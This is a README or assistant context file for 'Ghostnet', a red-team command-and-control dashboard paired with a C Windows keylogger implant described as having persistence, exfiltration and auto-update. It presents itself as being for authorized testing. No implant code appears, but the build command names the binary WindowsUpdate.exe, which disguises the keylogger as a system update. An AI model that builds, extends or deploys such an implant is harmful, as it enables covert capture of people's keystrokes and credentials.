# Ghostnet

Red-team C2 dashboard + Windows keylogger implant for authorized internal security testing.

## Project Structure

- **`src/`** — React 18 + TypeScript + Vite 6 + Tailwind v4 dashboard
  - `app/App.tsx` — main layout, polling orchestration
  - `app/components/` — AgentSidebar, KeystrokeFeed, AgentDetailPanel, TopBar, FooterBar
  - `app/services/api.ts` — API client (fetch wrapper, snake_case→camelCase transforms)
  - `app/hooks/usePolling.ts` — generic polling hook
  - `app/types.ts` — shared types (Agent, KeystrokeEntry, ApiAgent, etc.)
  - `components/ui/` — shadcn/ui components
  - `.env` — `VITE_API_BASE_URL=http://localhost:54321`
- **`agent/`** — C Windows implant
  - `agent.c` (~1750 lines) — keylogger + persistence + exfil + auto-update
  - `agent_config.json` — default config shipped alongside .exe

## Commands

```bash
npm install    # install deps
npm run dev    # start dev server on :5173
npm run build  # production build
```

## Key Architecture

- **Dashboard** polls real REST API endpoints (no mock data). Expects a backend at `VITE_API_BASE_URL`.
- **Backend not built yet** — needs Netlify Functions + Supabase (PostgreSQL). Full API contracts in `CONTEXT.md`.
- **Agent** compiled with MinGW-w64: `gcc agent.c -o WindowsUpdate.exe -mwindows -lwinhttp -lpsapi -liphlpapi -ladvapi32 -lshell32 -lws2_32 -O2 -s`

## Guidelines

- No mock data — dashboard must poll real endpoints
- Environment variables via `.env` only
- Agent is a single C file — keep it that way
- Backend endpoints must match the contracts in CONTEXT.md
